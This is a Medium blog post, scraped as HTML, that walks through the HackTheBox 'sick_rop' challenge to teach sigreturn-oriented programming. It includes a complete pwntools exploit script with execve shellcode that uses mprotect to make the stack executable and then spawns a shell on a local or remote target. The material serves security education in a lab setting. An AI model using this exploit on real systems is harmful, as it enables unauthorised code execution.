https://miro.medium.com/max/1280/1*IqO_Mw8y7gIqJflrTpwVlw.png 640w, https://miro.medium.com/max/1400/1*IqO_Mw8y7gIqJflrTpwVlw.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq lj"><div class="kv s ap kw"><div class="lk ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*qhZvkVwfgaKN1hawRYtIwQ.png?q=20" width="700" height="47" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="47" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*qhZvkVwfgaKN1hawRYtIwQ.png" width="700" height="47" srcSet="https://miro.medium.com/max/552/1*qhZvkVwfgaKN1hawRYtIwQ.png 276w, https://miro.medium.com/max/1104/1*qhZvkVwfgaKN1hawRYtIwQ.png 552w, https://miro.medium.com/max/1280/1*qhZvkVwfgaKN1hawRYtIwQ.png 640w, https://miro.medium.com/max/1400/1*qhZvkVwfgaKN1hawRYtIwQ.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="2660" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">So we need to set RAX = 59 and RDI to the pointer “/bin/sh”. But again we do not have a pop RAX or pop RDI to perform this for us. What do we do ??</p><p id="6eab" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">And that’s where Sigreturn comes in place. We can pop out shellcode with only 2 gadgets!!!</p><h2 id="1b1b" class="if ig gh bb da ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb hd">WHAT IS SIGRETURN ?</h2><blockquote class="lc ld le"><p id="85b6" class="jc jd lf bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd"><strong class="bb ll">Sigreturn uses a signal handler to clean up the stack frame after a signal is triggered.</strong></p></blockquote><p id="e3d3" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">It also uses temporarily stored data such as registers on the stack to perform a task. We could set the value of registers using the pwntool built-in function. This could be done manually, But that is hectic as all the register values have to be sent manually even though they are not needed. But what to set the register values as? We will use the concept of sys_mprotect() here.</p><blockquote class="lc ld le"><p id="ff8b" class="jc jd lf bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html" class="eb lg" target="_blank" rel="noopener ugc nofollow"><strong class="bb ll">sys_mprotect</strong></a><strong class="bb ll">() makes a memory segment with a fixed address writable and executable.</strong></p></blockquote><p id="ce67" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Imagine doing this! You could execute a shellcode from your stack even if NX bit is enabled! And that&#x27;s exactly what we are going to do in this challenge.</p><h2 id="0fd8" class="if ig gh bb da ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb hd">HOW TO SOLVE THIS CHALLENGE ?</h2><p id="323e" class="jc jd gh bb b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy dn hd">First we set the register value to call the sys_mprotect. Then we trigger the sys_rt_sigreturn. Now we would have a stack which is executable. So we could inject a shellcode in the buffer and then return to this shellcode from the RIP region.</p><h2 id="3bf4" class="if ig gh bb da ih ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb hd">CHALLENGE</h2><p id="ad12" class="jc jd gh bb b je jf jg jh ji jj jk jl jm jn jo jp jq jr js jt ju jv jw jx jy dn hd">We start with checking the file type and memory protections involved with the binary</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq lm"><div class="kv s ap kw"><div class="ln ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*hKlVnyNpD-qd8sNuonuIsw.png?q=20" width="700" height="174" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="174" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*hKlVnyNpD-qd8sNuonuIsw.png" width="700" height="174" srcSet="https://miro.medium.com/max/552/1*hKlVnyNpD-qd8sNuonuIsw.png 276w, https://miro.medium.com/max/1104/1*hKlVnyNpD-qd8sNuonuIsw.png 552w, https://miro.medium.com/max/1280/1*hKlVnyNpD-qd8sNuonuIsw.png 640w, https://miro.medium.com/max/1400/1*hKlVnyNpD-qd8sNuonuIsw.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="171e" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">This is an ASM code directly compiled and is statically linked. Only NX and ASLR(Default) is enabled. So we cannot execute the shellcode without changing the stack as executable.</p><p id="ea55" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Lets see the entire code with objdump.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div class="fp fq lo"><div class="kv s ap kw"><div class="lp ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*qMAmVVx99bZ3wicWMyiSzA.png?q=20" width="689" height="608" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="689" height="608" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1378/1*qMAmVVx99bZ3wicWMyiSzA.png" width="689" height="608" srcSet="https://miro.medium.com/max/552/1*qMAmVVx99bZ3wicWMyiSzA.png 276w, https://miro.medium.com/max/1104/1*qMAmVVx99bZ3wicWMyiSzA.png 552w, https://miro.medium.com/max/1280/1*qMAmVVx99bZ3wicWMyiSzA.png 640w, https://miro.medium.com/max/1378/1*qMAmVVx99bZ3wicWMyiSzA.png 689w" sizes="689px" role="presentation"/></noscript></div></div></div></figure><p id="cdb6" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Let us analyze the code fully before we dive into exploiting it. The entry point is the _start, just like our main() in c code. From here, it calls the vuln() function. In the vuln() function there is a call to the read function. In the read function, the RAX(it is denoted as EAX here) gets the value 0. In the Linux Syscall table, 0 is for the read. After that, some parameters are passed and then Syscall is been called. So if you understood this part you can proceed further.</p><p id="38aa" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Now, let’s start building up our exploit. We need to find the overflow offset. For this let’s use gdb to find it out for us.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq lq"><div class="kv s ap kw"><div class="lr ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*RL4cAi9PpHF1QfGdz3oObg.png?q=20" width="700" height="215" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="215" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*RL4cAi9PpHF1QfGdz3oObg.png" width="700" height="215" srcSet="https://miro.medium.com/max/552/1*RL4cAi9PpHF1QfGdz3oObg.png 276w, https://miro.medium.com/max/1104/1*RL4cAi9PpHF1QfGdz3oObg.png 552w, https://miro.medium.com/max/1280/1*RL4cAi9PpHF1QfGdz3oObg.png 640w, https://miro.medium.com/max/1400/1*RL4cAi9PpHF1QfGdz3oObg.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="d99e" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">As this is a 64bit binary, We need to look at what the RBP is overwritten with and then add 8 bytes to it to get to the RIP/Return region.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq ls"><div class="kv s ap kw"><div class="lt ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*IFXEa_Et85SV6AlA1sBC4Q.png?q=20" width="700" height="265" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="265" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*IFXEa_Et85SV6AlA1sBC4Q.png" width="700" height="265" srcSet="https://miro.medium.com/max/552/1*IFXEa_Et85SV6AlA1sBC4Q.png 276w, https://miro.medium.com/max/1104/1*IFXEa_Et85SV6AlA1sBC4Q.png 552w, https://miro.medium.com/max/1280/1*IFXEa_Et85SV6AlA1sBC4Q.png 640w, https://miro.medium.com/max/1400/1*IFXEa_Et85SV6AlA1sBC4Q.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="e28f" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">We can see the RBP is overwritten with “iaaajaaa”</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div class="fp fq lu"><div class="kv s ap kw"><div class="lv ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*EqkGfMk-rgMp7wcL9ewbQQ.png?q=20" width="571" height="103" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="571" height="103" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1142/1*EqkGfMk-rgMp7wcL9ewbQQ.png" width="571" height="103" srcSet="https://miro.medium.com/max/552/1*EqkGfMk-rgMp7wcL9ewbQQ.png 276w, https://miro.medium.com/max/1104/1*EqkGfMk-rgMp7wcL9ewbQQ.png 552w, https://miro.medium.com/max/1142/1*EqkGfMk-rgMp7wcL9ewbQQ.png 571w" sizes="571px" role="presentation"/></noscript></div></div></div></figure><p id="6da6" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">So 32 + 8 is the overflow offset here.</p><p id="a683" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Next, we come to the main concept, Sigreturn. We use the mprotect first to make a memory segment writeable. Then we Call the sigreturn handler and then place our shellcode into the buffer and execute it. <br/>First, let us find a writable memory segment. I am opening ghidra for this. Ghidra kinda gives us an idea about where this binary starts. There is a prompt when we import the binary.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div class="fp fq lw"><div class="kv s ap kw"><div class="lx ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*xBBf1Kaw8gBlMwlQclpnQQ.png?q=20" width="416" height="136" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="416" height="136" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/832/1*xBBf1Kaw8gBlMwlQclpnQQ.png" width="416" height="136" srcSet="https://miro.medium.com/max/552/1*xBBf1Kaw8gBlMwlQclpnQQ.png 276w, https://miro.medium.com/max/832/1*xBBf1Kaw8gBlMwlQclpnQQ.png 416w" sizes="416px" role="presentation"/></noscript></div></div></div></figure><p id="f22b" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">The minimum address is 0x400000. So we will make this place a writable segment. Next from syscall table. sys_mprotect is RAX=10. In pwntools, you can create a frame with all register values you want.</p><p id="a638" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Next, we need the syscall address to place in one of the registers. For this, we can use ROPgadget.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq ly"><div class="kv s ap kw"><div class="lz ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*lpR6D3fCJaP7LKgLDmHkvQ.png?q=20" width="700" height="58" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="58" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*lpR6D3fCJaP7LKgLDmHkvQ.png" width="700" height="58" srcSet="https://miro.medium.com/max/552/1*lpR6D3fCJaP7LKgLDmHkvQ.png 276w, https://miro.medium.com/max/1104/1*lpR6D3fCJaP7LKgLDmHkvQ.png 552w, https://miro.medium.com/max/1280/1*lpR6D3fCJaP7LKgLDmHkvQ.png 640w, https://miro.medium.com/max/1400/1*lpR6D3fCJaP7LKgLDmHkvQ.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="cc50" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Here is the code for frame.</p><pre class="ke kf kg kh ki kj kk kl"><span id="8e23" class="hd if ig gh km b dv kn ko s kp">syscall = 0x401014</span><span id="4b38" class="hd if ig gh km b dv ma mb mc md me ko s kp">vuln_function  = p64(0x40102e)<br/>vuln_pointer = 0x4010d8</span><span id="92a5" class="hd if ig gh km b dv ma mb mc md me ko s kp">writable = 0x400000</span><span id="0e2a" class="hd if ig gh km b dv ma mb mc md me ko s kp">frame = SigreturnFrame(kernel=”amd64&quot;)<br/>frame.rax = 10 #Mprotect for syscall table<br/>frame.rdi = writable #Writable memory segment<br/>frame.rsi = 0x4000 #Size<br/>frame.rdx = 7 #Read/Write/Exectable access<br/>frame.rsp = vuln_pointer #Why not vuln function but a pointer to vuln? Explained below<br/>frame.rip = syscall #Calling the syscall in the end</span></pre><p id="d9f6" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">These are the registers we will use to create a frame and trigger a sigreturn call after this.</p><p id="d9a6" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Here, RAX=10 is for calling the mprotect for the Linux syscall table. RDI=writable area segment. RSI = 0x4000, This is the size of the stack frame we allocate(You can change this value).RDX=7 for giving the stack frame read, write, and executable access.</p><p id="f3b2" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Now here is where I stumbled a bit. RSP is for returning to a place after the entire process finishes (Just like a safe point without crashing). Calling the vuln() again is an advantage here as we get to call the read function again. Notice I did not send the vuln function address here, instead, I called pointer to vuln function. This is because we are changing the stack frame and calling the vuln function directly will not get us to that function.</p><p id="fe1e" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Fortunately calling a pointer to function allows us to get to the vuln function. We can find the pointer value using gdb. Break the main and then use “find” in gdb-peda.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq mf"><div class="kv s ap kw"><div class="mg ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*ecAyT1nvEDPc_6U_SpqrWQ.png?q=20" width="700" height="106" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="106" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*ecAyT1nvEDPc_6U_SpqrWQ.png" width="700" height="106" srcSet="https://miro.medium.com/max/552/1*ecAyT1nvEDPc_6U_SpqrWQ.png 276w, https://miro.medium.com/max/1104/1*ecAyT1nvEDPc_6U_SpqrWQ.png 552w, https://miro.medium.com/max/1280/1*ecAyT1nvEDPc_6U_SpqrWQ.png 640w, https://miro.medium.com/max/1400/1*ecAyT1nvEDPc_6U_SpqrWQ.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="0383" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">0x4010d8 is the pointer of the function vuln.</p><p id="015e" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Now we craft our first payload.</p><pre class="ke kf kg kh ki kj kk kl"><span id="30dd" class="hd if ig gh km b dv kn ko s kp">payload = b&quot;A&quot;*40 + vuln_function + p64(syscall) + bytes(frame)</span></pre><p id="5076" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">First, we overwrite and reach RIP/Return with 40 junk characters. Then we call the vuln_function to get the read function. Calling a syscall will execute the read and then we send in the frame as bytes. Now we need to trigger a sigreturn signal to activate what we just sent. To call a sigreturn we can have a look at the Linux syscall table again. Rax=15 will trigger a sigreturn. But we don’t have any pop rax gadget here to trigger a sigreturn call. But here is a technique that works. The number of bytes we send in the input stream after executing the binary is stored in the RAX. We can notice this if you attach gdb after the first payload is sent</p><pre class="ke kf kg kh ki kj kk kl"><span id="f069" class="hd if ig gh km b dv kn ko s kp">payload1 = b&quot;A&quot;*40 + vuln_function + p64(syscall) + bytes(frame)</span><span id="053b" class="hd if ig gh km b dv ma mb mc md me ko s kp">p.sendline(payload1)<br/>p.recv()</span><span id="5449" class="hd if ig gh km b dv ma mb mc md me ko s kp">gdb.attach(p)</span></pre></div></div><div class="hy"><div class="n p"><div class="mh mi mj mk ml mm at mn au mo aw w"><figure class="ke kf kg kh ki hy mq mr paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq mp"><img alt="" class="w id ie" src="https://miro.medium.com/max/2000/1*xWnrhgphGbEM-8muIYQO1w.png" width="1000" height="344" role="presentation"/></div></div></figure></div></div></div><div class="n p"><div class="aq ar as at au gf aw w"><p id="c518" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">I sent some junk char into the input stream. Then I had a look at the reg values. RAX is set to 54. But we only send 53 characters into the stream. So the enter key after I sent an input is also taken into consideration.</p><p id="d378" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">The second payload is just 15 junk characters.</p><pre class="ke kf kg kh ki kj kk kl"><span id="4b91" class="hd if ig gh km b dv kn ko s kp">payload = b&quot;C&quot;*15<br/>p.send(payload)<br/>p.recv()</span></pre><p id="2949" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">After this our stack becomes executable and you can confirm this with gdb attach after sending the second payload.</p><p id="98f6" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Next, we can store the payload into our buffer. Then Execute it by calling the starting of shellcode address in our RIP/Return region. For finding the starting of shellcode we use gdb attach again.</p><pre class="ke kf kg kh ki kj kk kl"><span id="78d6" class="hd if ig gh km b dv kn ko s kp">payload = b&quot;C&quot;*15</span><span id="0b36" class="hd if ig gh km b dv ma mb mc md me ko s kp">p.send(payload)<br/>p.recv()</span><span id="81de" class="hd if ig gh km b dv ma mb mc md me ko s kp">gdb.attach(p)</span></pre></div></div><div class="hy"><div class="n p"><div class="mh mi mj mk ml mm at mn au mo aw w"><figure class="ke kf kg kh ki hy mq mr paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq ms"><img alt="" class="w id ie" src="https://miro.medium.com/max/2000/1*UeNBnalh6kgLyiFcRvJRaQ.png" width="1000" height="437" role="presentation"/></div></div></figure></div></div></div><div class="n p"><div class="aq ar as at au gf aw w"><p id="347e" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">The bunch of A’s are stored in RSI/R10, So 0x4010b8 is the starting address of shellcode. Instead of A’s we can store our shellcode and execute it.</p><pre class="ke kf kg kh ki kj kk kl"><span id="187c" class="hd if ig gh km b dv kn ko s kp">shellcode = (b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;) # 23bytes</span><span id="071e" class="hd if ig gh km b dv ma mb mc md me ko s kp">payload3 = shellcode + b&quot;\x90&quot;*17 + p64(0x00000000004010b8)</span><span id="dd82" class="hd if ig gh km b dv ma mb mc md me ko s kp">p.send(payload3)<br/>p.recv()</span></pre><p id="513f" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">17 bytes is to fill the extra spaces after shellcode is stored. Calling the starting address of shellcode, we can execute the shellcode and pop our shell.</p><p id="5793" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Here is the full code.</p><pre class="ke kf kg kh ki kj kk kl"><span id="b268" class="hd if ig gh km b dv kn ko s kp">from pwn import *<br/>context.clear(arch=&#x27;amd64&#x27;)</span><span id="4b0d" class="hd if ig gh km b dv ma mb mc md me ko s kp">p = process(&quot;./sick_rop&quot;)<br/>p = remote(&quot;*IP Address*&quot; , port number)</span><span id="23c5" class="hd if ig gh km b dv ma mb mc md me ko s kp">shellcode = (b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;) # 23B // From shellstrorm</span><span id="7649" class="hd if ig gh km b dv ma mb mc md me ko s kp">syscall = 0x401014</span><span id="30e9" class="hd if ig gh km b dv ma mb mc md me ko s kp">vuln_function  = p64(0x40102e)<br/>vuln_pointer = 0x4010d8</span><span id="e3df" class="hd if ig gh km b dv ma mb mc md me ko s kp">writable = 0x400000</span><span id="0d7c" class="hd if ig gh km b dv ma mb mc md me ko s kp">frame = SigreturnFrame(kernel=&quot;amd64&quot;)<br/>frame.rax = 10 #Mprotect for syscall table<br/>frame.rdi = writable #Writable memory segment<br/>frame.rsi = 0x4000 #Size<br/>frame.rdx = 7 #Read/Write/Exectable access<br/>frame.rsp = vuln_pointer #Why not vuln function but a pointer to vuln?<br/>frame.rip = syscall #Calling the syscall in the end</span><span id="24a4" class="hd if ig gh km b dv ma mb mc md me ko s kp">payload1 = b&quot;A&quot;*40 + vuln_function + p64(syscall) + bytes(frame)</span><span id="08b5" class="hd if ig gh km b dv ma mb mc md me ko s kp">p.sendline(payload1)<br/>p.recv()</span><span id="0f2f" class="hd if ig gh km b dv ma mb mc md me ko s kp">#gdb.attach(p)</span><span id="b0f0" class="hd if ig gh km b dv ma mb mc md me ko s kp">payload = b&quot;C&quot;*15</span><span id="79a5" class="hd if ig gh km b dv ma mb mc md me ko s kp">p.send(payload)<br/>p.recv()</span><span id="893c" class="hd if ig gh km b dv ma mb mc md me ko s kp">payload3 = shellcode + b&quot;\x90&quot;*17 + p64(0x00000000004010b8)</span><span id="7ed6" class="hd if ig gh km b dv ma mb mc md me ko s kp">p.send(payload3)<br/>p.recv()</span><span id="a457" class="hd if ig gh km b dv ma mb mc md me ko s kp"># gdb.attach(p)</span><span id="b2dd" class="hd if ig gh km b dv ma mb mc md me ko s kp">p.interactive()</span></pre><p id="7bfe" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Executing this, we pop our shell.</p><figure class="ke kf kg kh ki hy fp fq paragraph-image"><div role="button" tabindex="0" class="hz ia ap ib w ic"><div class="fp fq mt"><div class="kv s ap kw"><div class="mu ky s"><div class="es kr ei ev er fa w ks kt ku"><img alt="" class="ei ev er fa w kz la lb" src="https://miro.medium.com/max/60/1*bZUFmM50lkfN1zQFO_QtjA.png?q=20" width="700" height="112" role="presentation"/></div><img alt="" class="es kr ei ev er fa w c" width="700" height="112" role="presentation"/><noscript><img alt="" class="ei ev er fa w" src="https://miro.medium.com/max/1400/1*bZUFmM50lkfN1zQFO_QtjA.png" width="700" height="112" srcSet="https://miro.medium.com/max/552/1*bZUFmM50lkfN1zQFO_QtjA.png 276w, https://miro.medium.com/max/1104/1*bZUFmM50lkfN1zQFO_QtjA.png 552w, https://miro.medium.com/max/1280/1*bZUFmM50lkfN1zQFO_QtjA.png 640w, https://miro.medium.com/max/1400/1*bZUFmM50lkfN1zQFO_QtjA.png 700w" sizes="700px" role="presentation"/></noscript></div></div></div></div></figure><p id="5363" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Use this in remote and get your flag.</p><p id="35d6" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Hope you understood the challenge. Do check out my other blogs.</p><p id="69b6" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Don’t forget to give some claps if you reached here :) Follow me for more write-ups.</p><p id="5765" class="jc jd gh bb b je jz jg jh ji ka jk jl jm kb jo jp jq kc js jt ju kd jw jx jy dn hd">Goodbye:)</p></div></div></section></div></article><div class="es gb et nc w nd ev na ne" data-test-id="post-sidebar"><div class="n p"><div class="aq ar as at au av aw w"><div class="nf n aj"><div class="gb"><div><div class="ng s"><div class="mq s"><a class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" rel="noopener follow" href="/?source=post_sidebar--------------------------post_sidebar-----------"><h2 class="bb da dv bd dl hd dn">Hariharan@Blog:~$</h2></a></div><div class="nh s"><p class="bb b bc bd dy">Computer Science Student @ SASTRA deemed to be University .</p></div><div class="ni n"><span><button class="do b bc bd nj bf nk nl ff nm fi bm bn bo nn fl bs bt bu bv bw bx">Follow</button></span><div class="hk s"></div></div></div><div class="no np w n o ay nq"><div class="nr n"><div class="n o ay"><div class="s ap ns nt nu nv nw"><span><a href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8b27727cd441&amp;operation=register&amp;redirect=https%3A%2F%2Fcorruptedprotocol.medium.com%2Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441&amp;user=Hariharan%40Blog%3A~%24&amp;userId=ec69897f3ac2&amp;source=post_sidebar-----8b27727cd441---------------------clap_sidebar-----------" class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" rel="noopener follow"><div class="cf nx ny nz en oa ob oc r od oe"><svg width="29" height="29" aria-label="clap"><g fill-rule="evenodd"><path d="M13.74 1l.76 2.97.76-2.97zM16.82 4.78l1.84-2.56-1.43-.47zM10.38 2.22l1.84 2.56-.41-3.03zM22.38 22.62a5.11 5.11 0 0 1-3.16 1.61l.49-.45c2.88-2.89 3.45-5.98 1.69-9.21l-1.1-1.94-.96-2.02c-.31-.67-.23-1.18.25-1.55a.84.84 0 0 1 .66-.16c.34.05.66.28.88.6l2.85 5.02c1.18 1.97 1.38 5.12-1.6 8.1M9.1 22.1l-5.02-5.02a1 1 0 0 1 .7-1.7 1 1 0 0 1 .72.3l2.6 2.6a.44.44 0 0 0 .63-.62L6.1 15.04l-1.75-1.75a1 1 0 1 1 1.41-1.41l4.15 4.15a.44.44 0 0 0 .63 0 .44.44 0 0 0 0-.62L6.4 11.26l-1.18-1.18a1 1 0 0 1 0-1.4 1.02 1.02 0 0 1 1.41 0l1.18 1.16L11.96 14a.44.44 0 0 0 .62 0 .44.44 0 0 0 0-.63L8.43 9.22a.99.99 0 0 1-.3-.7.99.99 0 0 1 .3-.7 1 1 0 0 1 1.41 0l7 6.98a.44.44 0 0 0 .7-.5l-1.35-2.85c-.31-.68-.23-1.19.25-1.56a.85.85 0 0 1 .66-.16c.34.06.66.28.88.6L20.63 15c1.57 2.88 1.07 5.54-1.55 8.16a5.62 5.62 0 0 1-5.06 1.65 9.35 9.35 0 0 1-4.93-2.72zM13 6.98l2.56 2.56c-.5.6-.56 1.41-.15 2.28l.26.56-4.25-4.25a.98.98 0 0 1-.12-.45 1 1 0 0 1 .29-.7 1.02 1.02 0 0 1 1.41 0zm8.89 2.06c-.38-.56-.9-.92-1.49-1.01a1.74 1.74 0 0 0-1.34.33c-.38.29-.61.65-.71 1.06a2.1 2.1 0 0 0-1.1-.56 1.78 1.78 0 0 0-.99.13l-2.64-2.64a1.88 1.88 0 0 0-2.65 0 1.86 1.86 0 0 0-.48.85 1.89 1.89 0 0 0-2.67-.01 1.87 1.87 0 0 0-.5.9c-.76-.75-2-.75-2.7-.04a1.88 1.88 0 0 0 0 2.66c-.3.12-.61.29-.87.55a1.88 1.88 0 0 0 0 2.66l.62.62a1.88 1.88 0 0 0-.9 3.16l5.01 5.02c1.6 1.6 3.52 2.64 5.4 2.96a7.16 7.16 0 0 0 1.18.1c1.03 0 2-.25 2.9-.7A5.9 5.9 0 0 0 23 23.24c3.34-3.34 3.08-6.93 1.74-9.17l-2.87-5.04z"></path></g></svg></div></a></span></div></div></div><div class="of nr s"><div class="n"><button class="en ny cf"><div class="n o ay"><div class="n o"><svg width="25" height="25" aria-label="responses" class="og oh en oe"><path d="M19.07 21.12a6.33 6.33 0 0 1-3.53-1.1 7.8 7.8 0 0 1-.7-.52c-.77.21-1.57.32-2.38.32-4.67 0-8.46-3.5-8.46-7.8C4 7.7 7.79 4.2 12.46 4.2c4.66 0 8.46 3.5 8.46 7.8 0 2.06-.85 3.99-2.4 5.45a6.28 6.28 0 0 0 1.14 2.59c.15.21.17.48.06.7a.69.69 0 0 1-.62.38h-.03zm0-1v.5l.03-.5h-.03zm-3.92-1.64l.21.2a6.09 